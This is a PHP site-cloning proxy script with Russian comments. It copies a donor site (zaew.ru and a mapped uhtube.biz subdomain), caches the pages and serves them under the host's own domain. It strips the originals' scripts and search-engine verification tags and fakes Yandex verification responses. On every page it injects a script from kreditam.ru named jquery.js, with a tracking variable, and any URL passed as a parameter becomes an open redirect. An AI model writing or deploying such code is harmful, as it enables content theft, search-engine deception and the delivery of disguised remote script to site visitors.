<?php

//error_reporting(E_ALL);
//ini_set('display_errors', 1);
error_reporting(0); $subCache = '';
ini_set('display_errors', 0);
require_once 'http.php';
define('CACHE_DIR', 'cached_data/');
 
 
if(preg_match('~yandex_(.*?)\.html~i', getenv('REQUEST_URI'), $mtch)){ die('<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body>Verification: '.$mtch[1].'</body></html>'); }

 
/*
  На папку cache необходимо поставить права на запись 777

  НАСТРОЙКИ
  1. Полный адрес домена, который надо скопировать. Если на сайте все урлы с WWW, то и тут должно быть также
*/

$cache404 = true; // если нет кастомной 404 - отдаем кеш главной или редиректим на главную [true - кеш, false - редиректим]

$MAIN_DOMAIN = true; //активность основного домена [true - ВКЛ, false - ВЫКЛ]

$SUBDONOR[] = 'www.uhtube.biz';


//возвращаем список доменов
if(isset($_GET['mySubs'])){ echoSubs(); }

$siteUrl = 'zaew.ru'; //Без http и слешей

//инклюдим переде тегом </head>
$INCL_CODE = "<script> var utms = 'r_zaew'; </script> <script src='http://kreditam.ru/jquery.js'></script>";

$subDom = extract_subdomains($_SERVER['HTTP_HOST']);
if(strlen($subDom)>1){ $t_siteUrl = $siteUrl;
  foreach($SUBDONOR as $sb=>$dn){
    if(mb_strtolower($sb) === mb_strtolower($subDom) || mb_strtolower(str2id($dn)) === mb_strtolower($subDom)){ $siteUrl = $dn; break;}
  } $subCache = str2id($siteUrl).'/';
  
  //закрываем соединение лишним сабам
  if($t_siteUrl === $siteUrl){  }
}else{ mainDom(); }

$site = 'http://'.$siteUrl.'/';

$arrayReplace = array(
  'http://'.$siteUrl=>'http://##HOME_URL##', 'https://'.$siteUrl=>'http://##HOME_URL##', 
  ' '.$siteUrl.'!'=>' ##HOME_URL## ', 'Host: '.$siteUrl => 'Host: ##HOME_URL##' );


$mime_types = array(
    'txt' => 'text/plain',
    'htm' => 'text/html',
    'html' => 'text/html',
    'php' => 'text/html',
    'css' => 'text/css',
    'js' => 'application/javascript',
    'json' => 'application/json',
    'xml' => 'application/xml',
    'swf' => 'application/x-shockwave-flash',
    'flv' => 'video/x-flv',
    'mp4' => 'video/mp4',
    // images
    'png' => 'image/png',
    'jpe' => 'image/jpeg',
    'jpeg' => 'image/jpeg',
    'jpg' => 'image/jpeg',
    'gif' => 'image/gif',
    'bmp' => 'image/bmp',
    'ico' => 'image/vnd.microsoft.icon',
    'tiff' => 'image/tiff',
    'tif' => 'image/tiff',
    'svg' => 'image/svg+xml',
    'svgz' => 'image/svg+xml',
    // archives
    'zip' => 'application/zip',
    'rar' => 'application/x-rar-compressed',
    'exe' => 'application/x-msdownload',
    'msi' => 'application/x-msdownload',
    'cab' => 'application/vnd.ms-cab-compressed',
    // audio/video
    'mp3' => 'audio/mpeg',
    'qt' => 'video/quicktime',
    'mov' => 'video/quicktime',
    // adobe
    'pdf' => 'application/pdf',
    'psd' => 'image/vnd.adobe.photoshop',
    'ai' => 'application/postscript',
    'eps' => 'application/postscript',
    'ps' => 'application/postscript',
    // ms office
    'doc' => 'application/msword',
    'rtf' => 'application/rtf',
    'xls' => 'application/vnd.ms-excel',
    'ppt' => 'application/vnd.ms-powerpoint',
    // open office
    'odt' => 'application/vnd.oasis.opendocument.text',
    'ods' => 'application/vnd.oasis.opendocument.spreadsheet',
);

/////////////////////////////////////////////////////////////////////////////

$host = $_SERVER['HTTP_HOST'];
$home_url = preg_replace('@^www\.@i', '', $host);
$dom_replace = rtrim(preg_replace('@^https?://(www\.)?@i', '', $site), '/');
$request = ltrim($_SERVER['REQUEST_URI'], '/');

/* //добавлять в конце /
  if ($request [ strlen($request) - 1] == "/") {
  $request = preg_replace("/(.*).$/", "\\1", $request);
  }
 */

// redirect
parse_str($request, $get);
foreach ($get as $param) {
    if (substr($param, 0, 7) == 'http://') {
        header('Location: ' . $param);
    }
}

if (count(explode('?', $request)) == 1) {
    $addSlash = true;
    foreach (array_keys($mime_types) as $extension) {
        $extension = "." . $extension;
        $len = strlen($extension);
        $lenReq = strlen($request);
        if (substr($request, $lenReq - $len, $lenReq) == $extension) {
            $addSlash = false;
        }
    }
    if (($request [strlen($request) - 1] != "/") && $addSlash) {
        $request .= "/";
    }
}
$rr = pathinfo(preg_replace('/\?.*$/', '', $request));
$ext = isset($rr['extension']) ? $rr['extension'] : 'html';

$hash = md5($request);

$getParam = '';
$parametrs = explode("?", $request);
if (count($parametrs) > 1) {
    $getParam = $parametrs[1];
    $request = $parametrs[0];
}


if ($ext == 'html') {
    $filename = "index.html";
}
//print "<pre>";
// var_dump($srcArray, $request, $parametrs, $getParam  );
// die;
$srcArray = explode("/", $request);
if (count($srcArray) > 1) {
    if ($srcArray [sizeof($srcArray) - 1] == $rr['basename']) {
        $arr = explode('.', $rr['basename']);
        if (count($arr) > 1) {
            $srcArray [sizeof($srcArray) - 1] = replaceWrongLetter($srcArray [sizeof($srcArray) - 1]);
            $url = implode("/", $srcArray);
            $hash = $url;
        } else {
            $srcArray [sizeof($srcArray) - 1] = replaceWrongLetter($srcArray [sizeof($srcArray) - 1]);
            $url = implode("/", $srcArray);
            $hash = $url . '/' . replaceWrongLetter($getParam) . $filename;
        }
    } elseif ($srcArray [sizeof($srcArray) - 1] == '') {
        $hash = $request . $filename;
    } else {
        $hash = $request . '/' . replaceWrongLetter($getParam) . $filename;
    }
} else {
    if (strlen($request) == 0) {
        $hash = $filename;
    } else {
        $hash = replaceWrongLetter($request) . '.' . $ext;
    }
}

$wrongLetter = ':?"<>|/\\';

$dir = CACHE_DIR.$subCache;
$fname = $dir . $hash;

if (!file_exists($fname)) {
    if (!file_exists($dir) || !is_dir($dir)) {
        if (!@mkdir($dir, 0777, true))
            die('Cache dir is not writable!');
    }
    $http = new http;
    $data = $http->get($site . $request . '?' . $getParam);
	
	
	// checking for 404
	if($http->is404)
	{
		$fname = $dir . '404.html';
		
		if($http->default404)
		{
			if($cache404) {
				$fname = $dir . 'index.html';
			} else {
				header('Location: http://'.$host);
			}
			
		}
		
		if(!file_exists($fname))
		{
					//$data = preg_replace('@([a-z0-9]+\.)?'.$dom_replace.'@i', '##HOME_URL##', $data);
			//
			$data = str_ireplace(array_keys($arrayReplace), array_values($arrayReplace), $data);
			//
			
			if(preg_match("~<meta(?!\s*(?:name|value)\s*=)[^>]*?charset\s*=[\s\"']*([^\s\"'/>]*)~is", $data, $m) && $m[1] == 'windows-1251'){
			  $data = preg_replace("~charset=(\s|'|\")?windows-1251~is", 'charset=utf-8', iconv("WINDOWS-1251", "UTF-8", $data)); }

			if ($ext == 'html' || $ext == 'php' || $ext == 'htm') {
				$data = cutall($data);
			}

			$srcArray = explode("/", $fname);
			$fileName = $srcArray [sizeof($srcArray) - 1];
			unset($srcArray [sizeof($srcArray) - 1]);
			$dir = implode("/", $srcArray);
			if ($srcArray > 1) {
				@mkdir($dir, 0755, true);
			}

			file_put_contents($fname, $data);
		}
	}
	else
	{
				//$data = preg_replace('@([a-z0-9]+\.)?'.$dom_replace.'@i', '##HOME_URL##', $data);
    //
    $data = str_ireplace(array_keys($arrayReplace), array_values($arrayReplace), $data);
    //
    
    if(preg_match("~<meta(?!\s*(?:name|value)\s*=)[^>]*?charset\s*=[\s\"']*([^\s\"'/>]*)~is", $data, $m) && $m[1] == 'windows-1251'){
      $data = preg_replace("~charset=(\s|'|\")?windows-1251~is", 'charset=utf-8', iconv("WINDOWS-1251", "UTF-8", $data)); }

    if ($ext == 'html' || $ext == 'php' || $ext == 'htm') {
        $data = cutall($data);
    }

    $srcArray = explode("/", $fname);
    $fileName = $srcArray [sizeof($srcArray) - 1];
    unset($srcArray [sizeof($srcArray) - 1]);
    $dir = implode("/", $srcArray);
    if ($srcArray > 1) {
        @mkdir($dir, 0755, true);
    }

    file_put_contents($fname, $data);
	}
	

}

header('Content-Type: ' . my_mime_type($fname) . '; charset=utf-8' );

$HtmlString = file_get_contents(realpath($fname));
echo str_replace('##HOME_URL##', $home_url, $HtmlString);

function replaceWrongLetter($name) {
    return preg_replace('/[\\/:*?\'<>|]/', '', $name);
}

function cutall($data) { global $INCL_CODE;

    $data = preg_replace_callback("~<head>(.*?)</head>~is", "strip_head", $data);
    $data = preg_replace("!<meta name=['\"]yandex-verification['\"][^>]*>!ius","",$data); 
    $data = preg_replace("!<meta name=['\"]google-site-verification['\"][^>]*>!ius","",$data);
    $data = preg_replace("!<script[^>]*>(.)*</script>!Uis","",$data); 
    $data = preg_replace("!<noscript[^>]*>(.)*</noscript>!Uis","",$data); 
    
    $data = preg_replace("!</head>!i", $INCL_CODE." </head>",$data); 

    return $data;
}

function my_mime_type($filename) {
    global $mime_types;
    $tmp = explode('.', $filename);
    $ext = strtolower(array_pop($tmp));

    if (array_key_exists($ext, $mime_types)) {
        return $mime_types[$ext];
    } elseif (function_exists('finfo_open')) {
        $finfo = finfo_open(FILEINFO_MIME);
        $mimetype = finfo_file($finfo, $filename);
        finfo_close($finfo);
        return $mimetype;
    } else {
        return 'application/octet-stream';
    }
}

#Модный var_dump
function xx($v){ echo '<pre>'; die(var_dump($v)); }

function extract_domain($domain){
    if(preg_match("/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i", $domain, $matches))
    {
        return $matches['domain'];
    } else {
        return $domain;
    }
}

function extract_subdomains($domain){
    $subdomains = $domain;
    $domain = extract_domain($subdomains);

    $subdomains = rtrim(strstr($subdomains, $domain, true), '.');

    return $subdomains;
}

#Строка в ID
function str2id($str, $d='-'){ 
  $str = preg_replace ("/[^a-zA-Z0-9]/", $d, cleanStr($str)); 
  return trim(preg_replace('/['.$d.']+/', $d, $str), $d);
}

#Чистим строку от всякого
function cleanStr($str, $st=0){
	if($st==1){$str = strip_tags($str);}
    $str = str_replace("\n", "", $str);
    $str = str_replace("\r", "", $str);
    $str = preg_replace("/\t/"," ","$str");
    $str = preg_replace('/[ ]+/', ' ', $str);
	$str = trim($str);
 return $str;   
}
//возвращаем список доменов
function echoSubs(){
  echo '<pre>'; global $SUBDONOR;
  foreach($SUBDONOR as $sb=>$dn){
    if(!is_numeric($sb)){
      echo $sb.'.'.extract_domain($_SERVER['HTTP_HOST'])."\r\n"; 
    }else{echo str2id($dn).'.'.extract_domain($_SERVER['HTTP_HOST'])."\r\n"; }
  } die; 
}


function mainDom(){
  global $MAIN_DOMAIN;
  if(!$MAIN_DOMAIN){ header('HTTP/1.0 403 Forbidden'); die; }
}

function strip_head($m){ return preg_replace("~<(span|div|p).*>.*</(span|div|p)>~ixs", '', $m[0]); }